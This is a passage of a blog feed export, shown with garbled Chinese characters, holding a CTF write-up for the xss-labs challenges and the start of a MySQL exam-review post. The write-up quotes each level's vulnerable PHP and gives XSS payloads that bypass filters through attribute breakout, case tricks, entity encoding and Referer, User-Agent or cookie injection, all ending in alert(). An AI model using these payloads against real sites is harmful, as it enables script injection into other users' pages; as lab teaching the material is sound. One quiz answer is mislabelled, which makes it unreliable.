value=&quot;&#39;.&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&lt;.&#39;&quot;&gt;</code></pre><pre><code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&lt;</code></pre><p>é‡ç‚¹åœ¨äºé—­åˆå‰é¢çš„åŒå¼•å·å’Œ&lt;</p><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>çœ‹ä¸€äº›åç«¯ä»£ç ï¼š</p><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;    &lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt;</code></pre><p>ä¸éš¾çœ‹å‡ºï¼Œæˆ‘ä»¬å–ä½ å¯¹çš„æ˜¯htmlspecialcharsè¿™ä¸ªå‡½æ•°</p><pre><code>value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;</code></pre><p><a href="https://www.runoob.com/php/func-string-htmlspecialchars.html" target="_blank" rel="noopener">èœé¸Ÿæ•™ç¨‹å…³äºhtmlspecialcharså‡½æ•°</a>ï¼š</p><pre><code>htmlspecialchars() å‡½æ•°æŠŠä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;amp;&quot; ï¼ˆåŒå¼•å·ï¼‰æˆä¸º &amp;quot;&#39; ï¼ˆå•å¼•å·ï¼‰æˆä¸º &#39;&lt; ï¼ˆå°äºï¼‰æˆä¸º &amp;lt;&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &amp;gt;</code></pre><p>æ„é€ payloadï¼š</p><pre><code>&#39;onfocus=&#39;alert(&quot;xss&quot;)</code></pre><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>è¿™é‡Œçš„é€šè¿‡åº”ç”¨str_replaceå‡½æ•°å°†&lt;&gt;è½¬æ¢ä¸ºç©º</p><p>æ„é€ payloadï¼š</p><pre><code>&quot;&#39;&quot;onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;&quot;</code></pre><pre><code>&quot;onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>è¿™é‡Œåˆ©ç”¨äº†<a href="https://www.runoob.com/php/func-string-strtolower.html" target="_blank" rel="noopener">strtolower</a>å‡½æ•°å°†$strå¾—åˆ°çš„å€¼å…¨éƒ¨ä¸ºå°å†™ï¼Œä¹Ÿå°±æ˜¯é¢„é˜²äº†å¤§å°å†™ç»•è¿‡ï¼ŒåŒæ—¶åˆ©ç”¨str_replaceå‡½æ•°å°†&lt;scriptæ›¿æ¢ä¸º&lt;scr_iptï¼Œonè½¬æ¢ä¸ºäº†o_nï¼Œè§£å†³åŠæ³•ï¼šæ¢æ ‡ç­¾</p><p>æ„é€ payloadï¼š</p><pre><code>&lt;input name=keyword  value=&quot;&#39;.&quot;&gt;&lt;a herf=&#39;javascript:alert(&#39;666&#39;)&#39;&gt;ç‚¹æˆ‘&lt;/a&gt;//.&#39;&quot;&gt;</code></pre><pre><code>&quot;&gt;&lt;a href=javascript:alert(&#39;666&#39;)&gt;ç‚¹æˆ‘&lt;/a&gt;&lt;&quot;</code></pre><h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>å¤§å°å†™ç»•è¿‡ï¼š</p><pre><code>&quot;Onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>åŒå†™ç»•è¿‡ï¼š</p><pre><code>&quot;oonnfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?php echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>çªç ´ç‚¹ï¼šæ–°å¢çš„å‹æƒ…é“¾æ¥</p><p>å°†payloadè¿›è¡Œç¼–ç ï¼Œå˜æˆhtmlå®ä½“è¯­å¥ï¼š</p><pre><code>javascript:alert(1)</code></pre><p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">ç¼–ç ï¼š</a></p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</code></pre><h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?phpif(false===strpos($str7,&#39;http://&#39;)){  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;;        }else{  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;;}?&gt;</code></pre><p>æ¯”ä¸Šä¸€æ­¥å¤šäº†ä¸€ä¸ªhttp://çš„éªŒè¯</p><p>æ„é€ payloadï¼š</p><pre><code>javascript:alert(&#39;http://&#39;)</code></pre><p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">ç¼–ç ï¼š</a></p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(&#39;http://&#39;)</code></pre><h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>å¯ä»¥çœ‹å‡ºæœ€åçš„å‚æ•°ä¸º$str33ï¼Œè€Œ$str33æ˜¯ç”±$str22å†³å®šçš„ï¼Œ$str22æ˜¯ç”±$str11å†³å®šçš„ï¼Œä¸”ä¼ å…¥çš„ä¸ºä¸¤ä¸ªå‚æ•°ä¸”è¿‡æ»¤äº†&lt;&gt;æ‰€ä»¥ä¸é‡‡ç”¨æ ‡ç­¾æ’å…¥</p><pre><code>?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><pre><code>value=&quot;&#39;.&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><p>å¦ä¸€ç§ï¼š</p><pre><code>?keyword=1&amp;t_sort=&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><p>å»æ‰typeçš„hiddenå€¼ä¹Ÿå¯ä»¥</p><h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_REFERER&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>$_SERVER[â€˜HTTP_REFERERâ€™]ï¼šå¼•å¯¼ç”¨æˆ·ä»£ç†åˆ°å½“å‰é¡µçš„å‰ä¸€é¡µçš„åœ°å€ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚ç”± user agent è®¾ç½®å†³å®šã€‚å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç”¨æˆ·ä»£ç†éƒ½ä¼šè®¾ç½®è¯¥é¡¹ï¼Œæœ‰çš„è¿˜æä¾›äº†ä¿®æ”¹ HTTP_REFERER çš„åŠŸèƒ½ã€‚ç®€è¨€ä¹‹ï¼Œè¯¥å€¼å¹¶ä¸å¯ä¿¡ã€‚)</p><p>ç”±äºè¿™å‡½æ•°çš„å­˜åœ¨ï¼Œå¯¼è‡´å‡ºç°çš„äº†å¦ç±»çš„æ’å…¥ç‚¹ï¼šåœ¨refererä¸­æ¥æ‰§è¡Œxssä»£ç ï¼Œåªéœ€è¦ç”¨ç«ç‹æ’ä»¶modheaderå°±å¯ä»¥å®ç°é’ˆå¯¹è¯·æ±‚å¤´çš„ä¿®æ”¹payloadï¼š</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>$_SERVER[â€˜HTTP_USER_AGENTâ€™]ï¼šåº”è¯¥æ˜¯èµ‹äºˆç»™$str11HTTPå¤´ä¿¡æ¯ä¸­çš„USER_AGENTï¼Œä¸ä¸Šä¸€é¢˜çš„åˆ©ç”¨åŸç†ç›¸åŒï¼Œpayloadï¼š</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><pre><code>&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>è¿™æ¬¡æ˜¯cookie</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8801%E6%97%A51418_1.png" alt></p><h1 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h1><p>é¢˜ç›®åœ°å€å¤±æ•ˆ</p><h1 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;?&gt;</code></pre><p><code>ng-include</code>æŒ‡ä»¤ï¼š</p><pre><code>1ã€ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTMLæ–‡ä»¶ã€‚2ã€åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚3ã€ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚4ã€é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„å‡ ç‚¹å¦‚ä¸‹ï¼š1.ng-include,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å·2.ng-include,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ3.ng-include,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ«</code></pre><p>æ—¢ç„¶è¿™é‡Œå¯ä»¥åŒ…å«htmlæ–‡ä»¶ï¼Œé‚£ä¹ˆä¹Ÿå°±å¯ä»¥åŒ…å«ä¹‹å‰æœ‰è¿‡xssæ¼æ´çš„æºæ–‡ä»¶ï¼Œæ„é€ payloadï¼š</p><pre><code>?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><p>nameä¸ºlevel1ä¸­ä¼ å…¥çš„å‚æ•°å€¼</p><h1 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;</code></pre><p>ç‰¹æ®Šç‚¹ï¼šæ’å…¥äº†centeræ ‡ç­¾</p><p>ä½†æ˜¯è¿‡æ»¤äº†å¤šæ¬¡ç©ºæ ¼åƒæ˜¯åœ¨ç»™æˆ‘ä»¬æç¤ºï¼š%0a,æ„é€ payloadï¼š</p><pre><code>&lt;img%0asrc=666%0aonerror=alert(666);&gt;</code></pre><p>ç»è¿‡æµ‹è¯•%09å¤±è´¥</p><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><pre><code>&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt;</code></pre><p><a href="https://www.runoob.com/tags/att-embed-src.html" target="_blank" rel="noopener">HTML <embed> src å±æ€§</a></p><p> æ„é€ payloadï¼š</p><pre><code>arg01=a&amp;arg02=b onmouseover=alert(666)</code></pre><h1 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h1><pre><code>&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt;</code></pre><p>æ„é€ payloadï¼š</p><pre><code>arg01=a&amp;arg02=b onmouseover=alert(666)</code></pre><h1 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h1><p>æ¶‰åŠåç¼–è¯‘ï¼Œå¾…è§£</p><h1 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h1><p>æ¶‰åŠåç¼–è¯‘ï¼Œå¾…è§£</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLå­¦ä¹ </title>
      <link href="/2021/03/22/mysql-da-xue-xi/"/>
      <url>/2021/03/22/mysql-da-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1415663223&auto=1&height=66"></iframe><h1 id="ç®€ç­”é¢˜è€ƒç‚¹æ€»ç»“ï¼š"><a href="#ç®€ç­”é¢˜è€ƒç‚¹æ€»ç»“ï¼š" class="headerlink" title="ç®€ç­”é¢˜è€ƒç‚¹æ€»ç»“ï¼š"></a>ç®€ç­”é¢˜è€ƒç‚¹æ€»ç»“ï¼š</h1><ul><li>æ•°æ®åº“ç‰¹ç‚¹ï¼Ÿp3</li><li>mysqlä¼˜åŠ¿ï¼Ÿp11</li><li>å»ºç«‹ç´¢å¼•æœ‰å‡ ç§æ–¹æ³•ï¼Œç´¢å¼•çš„ä¼˜ç‚¹ï¼Œç´¢å¼•çš„ç±»å‹ï¼Ÿ</li><li>å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°å…·æœ‰å“ªä¸€äº›ä¼˜ç‚¹ï¼Ÿ</li><li>åœ¨å®é™…æ“ä½œä¸­ï¼Œå¯èƒ½ä¼šé€ æˆæ•°æ®ä¸¢å¤±çš„æœ‰å“ªäº›æ–¹é¢ï¼Ÿ</li><li>å¦‚ä½•ç”¨out tableä¿®æ”¹è¡¨åï¼Œå­—æ®µåï¼Œæ·»åŠ å­—æ®µï¼Œåˆ é™¤å­—æ®µï¼Œä¿®æ”¹å­—æ®µé¡ºåºï¼Œä¿®æ”¹å­—æ®µç±»å‹ï¼Ÿ</li><li>ä¸ºä»€ä¹ˆè¦åº”ç”¨è§¦å‘å™¨ï¼Œä»€ä¹ˆæ˜¯è§¦å‘å™¨ï¼Œè§¦å‘å™¨æœ‰å“ªå‡ ç§è§¦å‘å™¨æœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼Ÿ</li><li>ä»€ä¹ˆæ˜¯æ—¥å¿—æ–‡ä»¶ã€ä¸ºä»€ä¹ˆè¦è®¾ç«‹æ—¥å¿—æ–‡ä»¶ï¼Ÿ</li><li>ä»€ä¹ˆæ˜¯æ•°æ®åº“é•œåƒã€æœ‰ä»€ä¹ˆç”¨é€”ï¼Ÿ</li><li>äº‹ç‰©çš„æ¦‚å¿µã€äº‹åŠ¡çš„å››ä¸ªç‰¹æ€§ï¼Ÿ</li></ul><h1 id="Mysqlç»ƒä¹ é¢˜ç­”æ¡ˆæ±‡æ€»"><a href="#Mysqlç»ƒä¹ é¢˜ç­”æ¡ˆæ±‡æ€»" class="headerlink" title="Mysqlç»ƒä¹ é¢˜ç­”æ¡ˆæ±‡æ€»"></a>Mysqlç»ƒä¹ é¢˜ç­”æ¡ˆæ±‡æ€»</h1><p>æ•°æ®åº“ç³»ç»Ÿçš„è‹±æ–‡ç¼©å†™æ˜¯ï¼š<strong>DBS</strong></p><p>åœ¨å®¢æˆ·/æœåŠ¡å™¨ç»“æ„ä¸­,æ•°æ®åº“ç³»ç»Ÿç®¡ç†ç³»ç»Ÿç§°ä¸ºï¼š<strong>åå°</strong></p><p>è¡¨ç¤ºå±æ€§å–å€¼èŒƒå›´çš„æ˜¯ï¼š<strong>åŸŸ</strong></p><p>å¯ç”¨äºæˆäºˆæƒé™çš„SQLè¯­å¥æ˜¯ï¼š<strong>grant</strong></p><p>å¯ç”¨äºæ”¶å›æƒé™çš„SQLè¯­å¥æ˜¯ï¼š<strong>revoke</strong></p><p>åœ¨SQLè¯­è¨€ä¸­,ç”¨äºåˆ¤å®šå­æŸ¥è¯¢çš„ç»“æœé›†æ˜¯å¦ä¸ºç©ºçš„å…³é”®å­—æ˜¯ï¼š<strong>exist</strong></p><p>å¯¹äºå­˜å‚¨è¿‡ç¨‹è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆ1.0åˆ†ï¼‰</p><p>Aã€å­˜å‚¨è¿‡ç¨‹ç”±SQLè¯­å¥å’Œè¿‡ç¨‹å¼è¯­å¥ç»„æˆ</p><p><strong>Bã€å­˜å‚¨è¿‡ç¨‹å¿…é¡»åŒ…å« RETURNè¯­å¥</strong></p><p>Cã€å­˜å‚¨è¿‡ç¨‹å¯ä»¥æ‹¥æœ‰è¾“å‡ºå‚æ•°</p><p>Dã€ä½¿ç”¨CALLè¯­å¥å¯¹å­˜å‚¨è¿‡ç¨‹è°ƒç”¨</p><p>ä¿æŠ¤æ•°æ®åº“ä»¥é˜²æ­¢ä¸åˆæ³•çš„ä½¿ç”¨è€Œé€ æˆæ•°æ®æ³„éœ²ã€æ›´æ”¹æˆ–ç ´åæ˜¯æ•°æ®åº“çš„ï¼š<strong>å®‰å…¨æ€§</strong></p><p>åœ¨ MYSQLä¸­,åˆ é™¤è§¦å‘å™¨çš„è¯­å¥æ˜¯ï¼š<strong>drop trigger</strong></p><p>åœ¨ MYSQLä¸­,åˆ é™¤è§¦å‘å™¨çš„è¯­å¥æ˜¯ï¼š<strong>drop user</strong></p><p>å¯¹äºä½¿ç”¨å­˜å‚¨è¿‡ç¨‹çš„å¥½å¤„è¯´æ³•é”™è¯¯çš„æ˜¯(<strong>D</strong>)</p><p>A.å¯å¢å¼ºSQLè¯­è¨€çš„åŠŸèƒ½â€™</p><p>B.å¯å¢å¼ºSQLè¯­è¨€çš„çµæ´»æ€§</p><p>C.å…·æœ‰è‰¯å¥½çš„å°è£…æ€§</p><p><strong>D.ç³»ç»Ÿè¿è¡Œç¨³å®š</strong></p><p>åœ¨MySQLä¸­,ç”¨äºå®ç°å†…è¿æ¥çš„å…³é”®å­—æ˜¯ï¼š<strong>inner 